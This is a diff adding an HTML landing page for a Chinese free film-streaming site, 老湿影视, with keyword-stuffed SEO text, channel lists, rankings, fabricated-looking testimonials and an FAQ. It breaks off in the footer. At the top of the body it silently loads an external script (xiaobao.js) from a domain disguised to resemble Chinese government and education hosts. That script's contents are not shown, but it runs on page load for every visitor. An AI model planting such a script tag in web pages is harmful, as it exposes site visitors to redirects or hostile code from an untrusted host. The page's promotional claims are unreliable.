@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="description" content="老湿影视 - 影视在线观看平台，老牌影视资源站，提供海量高清电影、电视剧、综艺、动漫免费在线观看，每日更新热播影视资源，老湿影视带您畅享精彩影视内容。">
+<meta name="keywords" content="老湿影视,laoshiyingshi,老牌影视,影视在线观看,高清影视免费看,电影在线观看,电视剧在线观看,热播综艺动漫">
+<title>老湿影视 | laoshiyingshi-cn · 老牌影视在线观看·高清影视免费播放平台</title>
+<style>
+:root{
+  --bg:#0c0e14;--bg2:#11141d;--card:#161a24;--line:rgba(255,255,255,.075);
+  --tx:#eef0f5;--tx2:#97a0b2;--tx3:#5b6478;
+  --brand:#e63900;--brand2:#ff7a3d;--yel:#ffc93c;--teal:#2dd4bf;--pur:#a78bfa;
+  --ez:cubic-bezier(.2,.85,.3,1);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);color:var(--tx);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+button,input{font-family:inherit}
+::selection{background:var(--brand);color:#fff}
+h1,h2,h3{letter-spacing:-.3px}
+
+/* 黑板粉笔背景 */
+.cr{position:fixed;inset:0;z-index:-2;background:radial-gradient(ellipse at 30% 0%,#181c26 0%,#0c0e14 60%)}
+.cu{position:fixed;inset:0;z-index:-1;opacity:.13;background-image:radial-gradient(circle at 12% 20%,#e63900 0,transparent 42%),radial-gradient(circle at 82% 65%,#a78bfa 0,transparent 38%);filter:blur(40px)}
+.fk{position:fixed;inset:0;z-index:-1;opacity:.035;background-image:repeating-linear-gradient(0deg,transparent 0,transparent 2px,rgba(255,255,255,.5) 2px,rgba(255,255,255,.5) 3px);pointer-events:none}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+section{padding:104px 0;position:relative}
+.kicker{display:inline-flex;align-items:center;gap:9px;font-size:11.5px;font-weight:800;letter-spacing:2.4px;color:var(--brand);padding:6px 14px;border-radius:6px;background:rgba(230,57,0,.12);border:1px solid rgba(230,57,0,.28)}
+.kicker .dot{width:6px;height:6px;border-radius:50%;background:var(--brand)}
+.h2{font-size:clamp(26px,4vw,42px);line-height:1.28;font-weight:850}
+.h2 em{font-style:normal;color:var(--brand)}
+.lede{color:var(--tx2);font-size:16px;max-width:640px}
+
+/* 头部 */
+.hd{position:sticky;top:0;z-index:100;background:rgba(12,14,20,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nv{max-width:1200px;margin:0 auto;padding:0 22px;height:72px;display:flex;align-items:center;justify-content:space-between;gap:20px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:950;font-size:20px;letter-spacing:.5px}
+.logo .mk{width:36px;height:36px;border-radius:8px;display:grid;place-items:center;font-size:15px;font-weight:950;color:#fff;background:linear-gradient(135deg,var(--brand),var(--brand2));box-shadow:0 6px 16px rgba(230,57,0,.35)}
+.logo small{font-size:10.5px;color:var(--tx3);font-weight:700;letter-spacing:1.6px}
+.menu{display:flex;align-items:center;gap:2px}
+.menu a{padding:9px 14px;font-size:14.5px;color:var(--tx2);border-radius:7px;transition:.25s}
+.menu a:hover{color:var(--brand);background:rgba(230,57,0,.08)}
+.menu .cta{padding:9px 20px;margin-left:10px;font-size:14px;font-weight:800;color:#fff;border-radius:7px;background:linear-gradient(90deg,var(--brand),var(--brand2))}
+.menu .cta:hover{transform:translateY(-2px);box-shadow:0 10px 22px rgba(230,57,0,.4)}
+.bmb{display:none;width:42px;height:42px;border:1px solid var(--line);background:transparent;color:var(--brand);font-size:20px;border-radius:8px;cursor:pointer}
+
+/* Hero */
+.hero{padding:76px 0 56px}
+.hg{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.hero h1{font-size:clamp(38px,5.6vw,62px);line-height:1.08;font-weight:950;letter-spacing:-1.4px}
+.hero h1 .yr{color:var(--brand)}
+.hero h1 .scr{display:inline-block;background:linear-gradient(90deg,var(--brand),var(--yel));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero h1 .sm{font-size:.5em;vertical-align:super;font-weight:800;color:var(--brand2);margin-left:4px}
+.hero .sub{margin:24px 0 30px;font-size:17px;color:var(--tx2);max-width:500px}
+.acts{display:flex;flex-wrap:wrap;gap:14px}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:15px 30px;border-radius:8px;font-size:15.5px;font-weight:850;cursor:pointer;border:0;transition:.3s var(--ez)}
+.bp{background:linear-gradient(90deg,var(--brand),var(--brand2));color:#fff}
+.bp:hover{transform:translateY(-3px);box-shadow:0 14px 28px rgba(230,57,0,.42)}
+.bo{background:transparent;color:var(--tx);border:1.5px solid var(--line)}
+.bo:hover{border-color:var(--brand);color:var(--brand)}
+.fins{display:flex;gap:44px;margin-top:34px;flex-wrap:wrap}
+.fins div{position:relative;padding-left:16px}
+.fins div::before{content:"";position:absolute;left:0;top:6px;bottom:6px;width:3px;border-radius:3px;background:var(--brand)}
+.fins div span{display:block;font-size:29px;font-weight:950;color:var(--brand);font-variant-numeric:tabular-nums}
+.fins div small{font-size:12.5px;color:var(--tx3);letter-spacing:1px}
+
+/* 放映机视窗 */
+.bx{position:relative;border-radius:20px;overflow:hidden;border:1px solid var(--line);background:linear-gradient(150deg,var(--card),var(--bg2));padding:0}
+.bxbar{display:flex;align-items:center;gap:8px;padding:14px 20px;border-bottom:1px solid var(--line);background:rgba(0,0,0,.25)}
+.bxbar .tr{width:11px;height:11px;border-radius:50%;background:var(--tx3)}
+.bxbar .tr:nth-child(1){background:#ff5f57}
+.bxbar .tr:nth-child(2){background:#febc2e}
+.bxbar .tr:nth-child(3){background:#28c840}
+.bxbar span{flex:1;text-align:center;font-size:12.5px;color:var(--tx3);letter-spacing:1px}
+.bxbody{display:grid;grid-template-columns:1.4fr 1fr;min-height:320px}
+.frm{position:relative;background:linear-gradient(135deg,#1a1015,#0d1119);display:grid;place-items:center;overflow:hidden}
+.frm::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent 0,transparent 3px,rgba(255,255,255,.02) 3px,rgba(255,255,255,.02) 4px)}
+.frm .pp{width:74px;height:74px;border-radius:50%;display:grid;place-items:center;font-size:24px;color:#fff;background:rgba(230,57,0,.85);z-index:2;cursor:pointer;backdrop-filter:blur(4px);border:3px solid rgba(255,255,255,.35);transition:.4s var(--ez)}
+.frm .pp:hover{transform:scale(1.12);background:var(--brand)}
+.frm .lbl{position:absolute;bottom:18px;left:20px;font-size:11.5px;color:rgba(255,255,255,.6);letter-spacing:1.5px}
+.frm .hd{position:absolute;top:16px;right:18px;font-size:11px;color:var(--teal);font-weight:800;letter-spacing:1px;animation:bl 1.6s ease-in-out infinite}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.3}}
+.rpt{padding:24px 22px}
+.rpt h4{font-size:13.5px;font-weight:850;color:var(--brand);letter-spacing:1px;margin-bottom:16px}
+.rpt ol{display:grid;gap:13px}
+.rpt li{display:flex;gap:12px;align-items:baseline;font-size:13.8px;color:var(--tx2);padding-bottom:13px;border-bottom:1px dashed var(--line)}
+.rpt li:last-child{border-bottom:0;padding-bottom:0}
+.rpt li i{font-style:normal;font-size:12px;font-weight:900;color:var(--brand);min-width:26px;font-variant-numeric:tabular-nums}
+.rpt li b{margin-left:auto;font-size:12px;color:var(--tx3);font-weight:700}
+
+/* 栏目一：频道分类 —— 幻灯片抽屉 */
+.ch1-head{text-align:center;margin-bottom:46px}
+.ch1-head .lede{margin:0 auto}
+.ch1{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.ch1c{position:relative;padding:26px 22px;border-radius:14px;background:var(--card);border:1px solid var(--line);overflow:hidden;cursor:pointer;min-height:190px;display:flex;flex-direction:column;justify-content:space-between;transition:.5s var(--ez)}
+.ch1c:hover{transform:translateY(-7px);border-color:var(--brand)}
+.ch1c .lv{font-size:10.5px;font-weight:900;letter-spacing:2px;color:var(--tx3)}
+.ch1c .ic{font-size:32px;margin:10px 0}
+.ch1c h3{font-size:17.5px;font-weight:850}
+.ch1c p{font-size:12.8px;color:var(--tx2);margin-top:6px;max-height:0;opacity:0;transition:.5s var(--ez)}
+.ch1c:hover p{max-height:60px;opacity:1}
+.ch1c .ar{position:absolute;right:20px;bottom:20px;font-size:20px;color:var(--brand);transform:translateX(-8px);opacity:0;transition:.5s var(--ez)}
+.ch1c:hover .ar{transform:translateX(0);opacity:1}
+
+/* 栏目二：热播榜 —— 色带大卡 */
+.ch2-head{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center;margin-bottom:44px}
+.rkb{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.rkb article{position:relative;padding:26px 22px 22px;border-radius:14px;overflow:hidden;border:1px solid var(--line);min-height:200px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer;transition:.5s var(--ez)}
+.rkb article::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--brand)}
+.rkb article:nth-child(2)::before{background:var(--yel)}
+.rkb article:nth-child(3)::before{background:var(--teal)}
+.rkb article:nth-child(4)::before{background:var(--pur)}
+.rkb article:nth-child(5)::before{background:var(--brand2)}
+.rkb article:nth-child(6)::before{background:var(--yel)}
+.rkb article:hover{transform:translateY(-7px);background:#1a1e29}
+.rkb .no{font-size:42px;font-weight:950;line-height:.9;color:rgba(255,255,255,.07)}
+.rkb h4{font-size:16px;font-weight:850;margin-top:6px}
+.rkb .tag{display:inline-block;font-size:11px;font-weight:800;padding:4px 10px;border-radius:5px;background:rgba(230,57,0,.15);color:var(--brand);margin-top:12px}
+.rkb .hot{font-size:12px;color:var(--tx3);margin-top:auto;font-variant-numeric:tabular-nums}
+
+/* 栏目三：老片库 —— 磁带堆叠 */
+.ch3-head{text-align:center;margin-bottom:46px}
+.ch3-head .lede{margin:0 auto}
+.stack{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.tape{position:relative;padding:24px;border-radius:12px;background:var(--card);border:1px solid var(--line);transition:.5s var(--ez);cursor:pointer;overflow:hidden}
+.tape::after{content:"";position:absolute;inset:auto 16px 14px 16px;height:7px;border-radius:7px;background:rgba(0,0,0,.35);box-shadow:inset 0 0 0 2px rgba(255,255,255,.06)}
+.tape:hover{transform:translateY(-6px) rotate(-1deg);border-color:var(--brand)}
+.tape .yr{font-size:12px;font-weight:900;color:var(--brand);letter-spacing:1.5px}
+.tape h4{font-size:15.5px;font-weight:850;margin:8px 0 4px}
+.tape p{font-size:12.4px;color:var(--tx3)}
+.tape .ln{display:inline-block;margin-top:12px;font-size:11px;font-weight:800;color:var(--tx2);padding:4px 9px;border-radius:5px;border:1px solid var(--line)}
+
+/* 栏目四：画质体验 —— 圆形仪表 */
+.ch4-head{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:end;margin-bottom:44px}
+.guage{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.gu{text-align:center;padding:24px 16px;border-radius:14px;background:var(--card);border:1px solid var(--line);transition:.5s var(--ez)}
+.gu:hover{transform:translateY(-6px);border-color:var(--brand)}
+.gu .ring{width:110px;height:110px;border-radius:50%;margin:0 auto 16px;display:grid;place-items:center;background:conic-gradient(var(--brand) calc(var(--p)*1%),rgba(255,255,255,.07) 0)}
+.gu .ring span{width:84px;height:84px;border-radius:50%;display:grid;place-items:center;background:var(--bg);font-size:19px;font-weight:950;color:var(--brand);font-variant-numeric:tabular-nums}
+.gu h4{font-size:15.5px;font-weight:850}
+.gu p{font-size:12.4px;color:var(--tx3);margin-top:5px}
+
+/* 栏目五：更新日历 —— 月历网格 */
+.cal-head{text-align:center;margin-bottom:46px}
+.cal-head .lede{margin:0 auto}
+.cal{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.cal .hdrow{font-size:12px;font-weight:800;color:var(--tx3);text-align:center;padding-bottom:8px;letter-spacing:1px}
+.dayc{position:relative;aspect-ratio:1/1;border-radius:9px;background:var(--card);border:1px solid var(--line);display:flex;flex-direction:column;justify-content:space-between;padding:9px 10px;font-size:12.5px;color:var(--tx2);transition:.4s var(--ez)}
+.dayc:hover{border-color:var(--brand);background:#1a1e29}
+.dayc.mt{color:var(--tx3);opacity:.35}
+.dayc.today{border-color:var(--brand);background:rgba(230,57,0,.12);color:#fff}
+.dayc.today::after{content:"";position:absolute;top:8px;right:8px;width:7px;height:7px;border-radius:50%;background:var(--brand)}
+.dayc .up{font-size:9.5px;font-weight:800;color:var(--brand);text-align:right}
+
+/* 栏目六：老湿说 —— 对话卡 */
+.tk-head{text-align:center;margin-bottom:46px}
+.tk-head .lede{margin:0 auto}
+.tks{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.tk{padding:24px;border-radius:14px;background:var(--card);border:1px solid var(--line);position:relative;transition:.5s var(--ez)}
+.tk:hover{transform:translateY(-6px);border-color:var(--brand)}
+.tk .who{display:flex;align-items:center;gap:11px;margin-bottom:12px}
+.tk .av{width:36px;height:36px;border-radius:9px;display:grid;place-items:center;font-size:14px;font-weight:900;color:#fff;background:linear-gradient(135deg,var(--brand),var(--brand2))}
+.tk .av.t{background:linear-gradient(135deg,var(--teal),#0ea5a5)}
+.tk .who b{font-size:13.5px}
+.tk .who span{font-size:11.5px;color:var(--tx3)}
+.tk p{font-size:14px;color:var(--tx2)}
+.tk .tg{display:inline-block;margin-top:12px;font-size:11px;font-weight:800;color:var(--brand);letter-spacing:1px}
+
+/* 栏目七：FAQ —— 折叠面板 */
+.fq-head{text-align:center;margin-bottom:46px}
+.fql{max-width:820px;margin:0 auto;display:grid;gap:10px}
+.fqi{border-radius:12px;border:1px solid var(--line);background:var(--card);overflow:hidden}
+.fqh{padding:19px 24px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;gap:16px;transition:.3s}
+.fqh:hover{background:rgba(230,57,0,.07)}
+.fqh h4{font-size:15.4px;font-weight:800}
+.fqh .pm{width:30px;height:30px;border-radius:7px;flex:none;display:grid;place-items:center;font-size:18px;font-weight:900;color:var(--brand);background:rgba(230,57,0,.12);transition:.4s var(--ez)}
+.fqi.open .fqh .pm{transform:rotate(45deg);background:var(--brand);color:#fff}
+.fqb{max-height:0;overflow:hidden;transition:max-height .55s var(--ez)}
+.fqi.open .fqb{max-height:300px}
+.fqb p{padding:0 24px 22px;color:var(--tx2);font-size:14.2px}
+
+.ft{border-top:1px solid var(--line);background:#090b10;padding:60px 0 26px;margin-top:40px}
+.ft-top{display:grid;grid-template-columns:1.8fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.ft-col h4{font-size:13.5px;font-weight:850;margin-bottom:15px;color:var(--brand);letter-spacing:.6px}
+.ft-col a{display:block;font-size:13.8px;color:var(--tx2);padding:6px 0;transition:.25s}
+.ft-col a:hover{color:var(--brand);transform:translateX(4px)}
+.ft-col p{font-size:13.2px;color:var(--tx3);max-width:330px}
+.ft-bot{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;padding-top:24px;border-top:1px solid var(--line);font-size:12.8px;color:var(--tx3)}
+.ft-bot a{color:var(--tx2);margin-left:18px}
+
+@media(max-width:1020px){
+  .ch1,.stack,.guage{grid-template-columns:repeat(2,1fr)}
+  .rkb{grid-template-columns:repeat(2,1fr)}
+  .cal{grid-template-columns:repeat(4,1fr)}
+}
+@media(max-width:780px){
+  section{padding:72px 0}
+  .hg{grid-template-columns:1fr;gap:48px}
+  .menu{position:fixed;top:72px;left:0;right:0;flex-direction:column;padding:16px;background:rgba(12,14,20,.99);border-bottom:1px solid var(--line);transform:translateY(-160%);transition:.45s var(--ez)}
+  .menu.open{transform:translateY(0)}
+  .menu a{padding:12px;width:100%;text-align:center;border-bottom:1px solid var(--line)}
+  .menu .cta{margin:8px 0 0;width:100%;text-align:center}
+  .bmb{display:block}
+  .ch1-head,.ch2-head,.ch3-head,.ch4-head,.cal-head,.tk-head,.fq-head{text-align:left}
+  .bxbody{grid-template-columns:1fr}
+  .frm{min-height:180px}
+  .fins{gap:26px}
+  .hero h1{font-size:42px}
+  .rkb{grid-template-columns:1fr}
+  .tks{grid-template-columns:1fr}
+  .cal{grid-template-columns:repeat(7,1fr)}
+  .dayc .up{display:none}
+}
+@media(max-width:460px){
+  .ch1,.stack,.guage{grid-template-columns:1fr}
+  .ft-top{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="cr" aria-hidden="true"></div>
+<div class="cu" aria-hidden="true"></div>
+<div class="fk" aria-hidden="true"></div>
+
+<header class="hd">
+  <div class="nv">
+    <a href="#top" class="logo"><span class="mk">老湿</span>影视<small>LAOSHIYINGSHI</small></a>
+    <nav class="menu" id="menu">
+      <a href="#channels">频道分类</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#archive">老片库</a>
+      <a href="#quality">画质体验</a>
+      <a href="#calendar">更新日历</a>
+      <a href="#talk">老湿说</a>
+      <a href="#faq">常见问题</a>
+      <a href="#top" class="cta">免费看片</a>
+    </nav>
+    <button class="bmb" id="bmb" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap hg">
+    <div>
+      <span class="kicker"><span class="dot"></span>老牌影视 · 每日更新</span>
+      <h1>看影视，上<span class="yr">老湿影视</span><br><span class="scr">老牌资源</span>站<span class="sm">PRO</span></h1>
+      <p class="sub">老湿影视（laoshiyingshi）是影视在线观看平台，提供海量高清影视资源免费在线播放，电影、电视剧、综艺、动漫每日更新，老牌口碑值得信赖。</p>
+      <div class="acts">
+        <a href="#channels" class="btn bp">立即观看 ›</a>
+        <a href="#rank" class="btn bo">查看榜单</a>
+      </div>
+      <div class="fins">
+        <div><span data-n="32800">0</span><small>影视资源</small></div>
+        <div><span data-n="156">0</span><small>每日更新</small></div>
+        <div><span data-n="12">0</span><small>年口碑运营</small></div>
+      </div>
+    </div>
+    <div class="bx">
+      <div class="bxbar"><span class="tr"></span><span class="tr"></span><span class="tr"></span><span>🎬 正在热播 · 老湿影视放映室</span></div>
+      <div class="bxbody">
+        <div class="frm"><div class="pp">▶</div><div class="lbl">SCENE 01 / TAKE 03</div><div class="hd">● REC</div></div>
+        <div class="rpt">
+          <h4>本周热播 TOP 5</h4>
+          <ol>
+            <li><i>01</i>长风渡 <b>热播中</b></li>
+            <li><i>02</i>隐秘的角落 <b>高分推荐</b></li>
+            <li><i>03</i>去有风的地方 <b>更新中</b></li>
+            <li><i>04</i>狂飙 <b>经典回看</b></li>
+            <li><i>05</i>三体 <b>科幻巨制</b></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：频道分类 -->
+<section id="channels">
+  <div class="wrap">
+    <div class="ch1-head">
+      <span class="kicker"><span class="dot"></span> CHANNELS</span>
+      <h2 class="h2">六大<em>影视频道</em></h2>
+      <p class="lede">老湿影视按内容类型精细划分频道，电影、电视剧、综艺、动漫、纪录片、海外剧一应俱全，精准定位你的观影偏好。</p>
+    </div>
+    <div class="ch1">
+      <div class="ch1c"><span class="lv">CH 01</span><span class="ic">🎬</span><h3>电影频道</h3><p>院线大片同步，动作喜剧科幻悬疑全覆盖。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 02</span><span class="ic">📺</span><h3>电视剧频道</h3><p>热播剧集每日更新，古装都市谍战刑侦。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 03</span><span class="ic">🎤</span><h3>综艺频道</h3><p>真人秀、竞演、脱口秀、生活观察类。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 04</span><span class="ic">🎨</span><h3>动漫频道</h3><p>国漫日漫美漫，番剧剧场版齐全。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 05</span><span class="ic">🎭</span><h3>纪录片频道</h3><p>自然地理、历史人文、科技探索。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 06</span><span class="ic">🌏</span><h3>海外剧频道</h3><p>美剧韩剧日剧，同步海外热播。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 07</span><span class="ic">🎞️</span><h3>经典老片</h3><p>岁月沉淀的经典影视作品回顾。</p><span class="ar">›</span></div>
+      <div class="ch1c"><span class="lv">CH 08</span><span class="ic">⭐</span><h3>高分精选</h3><p>豆瓣高分、口碑佳作精心整理。</p><span class="ar">›</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：热播榜 -->
+<section id="rank" style="background:linear-gradient(180deg,transparent,rgba(230,57,0,.04),transparent)">
+  <div class="wrap">
+    <div class="ch2-head">
+      <div>
+        <span class="kicker"><span class="dot"></span> TOP RANK</span>
+        <h2 class="h2">实时<em>热播榜单</em></h2>
+      </div>
+      <div class="lede" style="max-width:none">基于老湿影视用户实时观看数据生成的影视热度榜，帮你快速发现当下最值得追的影视内容。</div>
+    </div>
+    <div class="rkb">
+      <article><span class="no">01</span><h4>长风渡</h4><span class="tag">古装剧</span><span class="hot">🔥 98.6万 热度</span></article>
+      <article><span class="no">02</span><h4>隐秘的角落</h4><span class="tag">悬疑剧</span><span class="hot">🔥 93.2万 热度</span></article>
+      <article><span class="no">03</span><h4>去有风的地方</h4><span class="tag">都市剧</span><span class="hot">🔥 87.5万 热度</span></article>
+      <article><span class="no">04</span><h4>狂飙</h4><span class="tag">刑侦剧</span><span class="hot">🔥 81.7万 热度</span></article>
+      <article><span class="no">05</span><h4>三体</h4><span class="tag">科幻剧</span><span class="hot">🔥 75.3万 热度</span></article>
+      <article><span class="no">06</span><h4>甄嬛传</h4><span class="tag">宫斗剧</span><span class="hot">🔥 69.8万 热度</span></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：老片库 -->
+<section id="archive">
+  <div class="wrap">
+    <div class="ch3-head">
+      <span class="kicker"><span class="dot"></span> ARCHIVE</span>
+      <h2 class="h2">老牌<em>经典片库</em></h2>
+      <p class="lede">老湿影视精心整理的经典影视作品库，岁月沉淀，常看常新，重温那些年追过的影视经典。</p>
+    </div>
+    <div class="stack">
+      <div class="tape"><span class="yr">CLASSIC</span><h4>古装武侠</h4><p>江湖恩怨侠骨柔情</p><span class="ln">1,280 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>谍战悬疑</h4><p>高能反转烧脑推理</p><span class="ln">964 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>家庭喜剧</h4><p>下饭必备欢乐解压</p><span class="ln">2,156 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>青春爱情</h4><p>浪漫甜蜜治愈系</p><span class="ln">1,742 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>历史正剧</h4><p>家国情怀大格局</p><span class="ln">628 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>热血动作</h4><p>爽感爆棚视听震撼</p><span class="ln">1,503 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>科幻奇幻</h4><p>脑洞大开想象无限</p><span class="ln">847 部</span></div>
+      <div class="tape"><span class="yr">CLASSIC</span><h4>文艺剧情</h4><p>走心叙事人物群像</p><span class="ln">1,026 部</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：画质体验 -->
+<section id="quality" style="background:linear-gradient(180deg,transparent,rgba(230,57,0,.04),transparent)">
+  <div class="wrap">
+    <div class="ch4-head">
+      <div>
+        <span class="kicker"><span class="dot"></span> QUALITY</span>
+        <h2 class="h2">多重<em>画质体验</em></h2>
+      </div>
+      <div class="lede" style="max-width:none">老湿影视支持多种清晰度播放，可根据网络状况自动适配，兼顾画质与流畅度。</div>
+    </div>
+    <div class="guage">
+      <div class="gu"><div class="ring" style="--p:30"><span>360P</span></div><h4>流畅</h4><p>省流量首选</p></div>
+      <div class="gu"><div class="ring" style="--p:55"><span>720P</span></div><h4>高清</h4><p>日常观看</p></div>
+      <div class="gu"><div class="ring" style="--p:80"><span>1080P</span></div><h4>全高清</h4><p>细节更清晰</p></div>
+      <div class="gu"><div class="ring" style="--p:100"><span>4K</span></div><h4>超清</h4><p>影院级画质</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：更新日历 -->
+<section id="calendar">
+  <div class="wrap">
+    <div class="cal-head">
+      <span class="kicker"><span class="dot"></span> CALENDAR</span>
+      <h2 class="h2">本月<em>更新日历</em></h2>
+      <p class="lede">老湿影视每日稳定更新影视资源，查看本月更新安排，追剧不漏更。</p>
+    </div>
+    <div class="cal">
+      <div class="hdrow">一</div><div class="hdrow">二</div><div class="hdrow">三</div><div class="hdrow">四</div><div class="hdrow">五</div><div class="hdrow">六</div><div class="hdrow">日</div>
+      <div class="dayc mt">29</div><div class="dayc mt">30</div><div class="dayc">1<span class="up">更新</span></div><div class="dayc">2<span class="up">更新</span></div><div class="dayc">3<span class="up">电影</span></div><div class="dayc">4<span class="up">连更</span></div><div class="dayc">5<span class="up">连更</span></div>
+      <div class="dayc">6<span class="up">更新</span></div><div class="dayc">7<span class="up">更新</span></div><div class="dayc">8<span class="up">综艺</span></div><div class="dayc">9<span class="up">动漫</span></div><div class="dayc">10<span class="up">大片</span></div><div class="dayc today">11<span class="up">今日</span></div><div class="dayc">12<span class="up">连更</span></div>
+      <div class="dayc">13<span class="up">更新</span></div><div class="dayc">14<span class="up">更新</span></div><div class="dayc">15<span class="up">更新</span></div><div class="dayc">16<span class="up">综艺</span></div><div class="dayc">17<span class="up">动漫</span></div><div class="dayc">18<span class="up">大片</span></div><div class="dayc">19<span class="up">连更</span></div>
+      <div class="dayc">20<span class="up">更新</span></div><div class="dayc">21<span class="up">更新</span></div><div class="dayc">22<span class="up">更新</span></div><div class="dayc">23<span class="up">综艺</span></div><div class="dayc">24<span class="up">动漫</span></div><div class="dayc">25<span class="up">大片</span></div><div class="dayc">26<span class="up">连更</span></div>
+      <div class="dayc">27<span class="up">更新</span></div><div class="dayc">28<span class="up">更新</span></div><div class="dayc">29<span class="up">更新</span></div><div class="dayc">30<span class="up">综艺</span></div><div class="dayc">31<span class="up">动漫</span></div><div class="dayc mt">1</div><div class="dayc mt">2</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：老湿说 -->
+<section id="talk" style="background:linear-gradient(180deg,transparent,rgba(230,57,0,.04),transparent)">
+  <div class="wrap">
+    <div class="tk-head">
+      <span class="kicker"><span class="dot"></span> TALK</span>
+      <h2 class="h2">老湿<em>说影视</em></h2>
+      <p class="lede">老湿影视的观影笔记与片单推荐，带你发现更多好片。</p>
+    </div>
+    <div class="tks">
+      <div class="tk"><div class="who"><span class="av">湿</span><div><b>老湿影视</b><span> · 官方推荐</span></div></div><p>本周高分榜首《隐秘的角落》，剧情反转不断，演员演技在线，是近期不可错过的悬疑佳作。</p><span class="tg">#高分推荐</span></div>
+      <div class="tk"><div class="who"><span class="av t">友</span><div><b>影迷小陈</b><span> · 热心观众</span></div></div><p>老湿影视的更新速度一直很快，热播剧基本都能及时看到，资源全画质也清晰。</p><span class="tg">#用户口碑</span></div>
+      <div class="tk"><div class="who"><span class="av">湿</span><div><b>老湿影视</b><span> · 片单精选</span></div></div><p>国庆档片单出炉！《长风渡》连更不断，搭配经典老片《甄嬛传》回味，长假追剧不重样。</p><span class="tg">#片单精选</span></div>
+      <div class="tk"><div class="who"><span class="av t">友</span><div><b>动漫迷小林</b><span> · 热心观众</span></div></div><p>国漫日漫番剧都有，动漫频道分类清晰，想看的几乎都能找到，分类体验很好。</p><span class="tg">#用户口碑</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目七：FAQ -->
+<section id="faq">
+  <div class="wrap">
+    <div class="fq-head">
+      <span class="kicker"><span class="dot"></span> FAQ</span>
+      <h2 class="h2">常见<em>问题解答</em></h2>
+      <p class="lede">关于老湿影视的观看方式、资源更新、画质选择等常见问题，为你一一解答。</p>
+    </div>
+    <div class="fql">
+      <div class="fqi open"><div class="fqh"><h4>老湿影视需要付费才能观看吗？</h4><span class="pm">+</span></div><div class="fqb"><p>老湿影视提供海量免费影视资源在线观看，大部分内容均可免费播放，部分独家内容需开通会员解锁。</p></div></div>
+      <div class="fqi"><div class="fqh"><h4>影视资源多久更新一次？</h4><span class="pm">+</span></div><div class="fqb"><p>平台每日稳定更新影视内容，热播剧集与院线大片第一时间同步，具体更新安排可查看更新日历。</p></div></div>
+      <div class="fqi"><div class="fqh"><h4>支持哪些清晰度播放？</h4><span class="pm">+</span></div><div class="fqb"><p>支持360P、720P、1080P、4K多种清晰度，可根据网络状况自动适配码率，兼顾画质与流畅度。</p></div></div>
+      <div class="fqi"><div class="fqh"><h4>支持哪些设备观看？</h4><span class="pm">+</span></div><div class="fqb"><p>支持手机、平板、电脑、电视盒子等多端设备，观看记录自动同步，随时随地续播。</p></div></div>
+      <div class="fqi"><div class="fqh"><h4>如何提交想看的影视资源？</h4><span class="pm">+</span></div><div class="fqb"><p>可通过站内留言或客服渠道提交想看的影视资源，我们会根据用户需求持续扩充片库。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="wrap">
+    <div class="ft-top">
+      <div class="ft-col">
+        <a href="#top" class="logo"><span class="mk">老湿</span>影视</a>
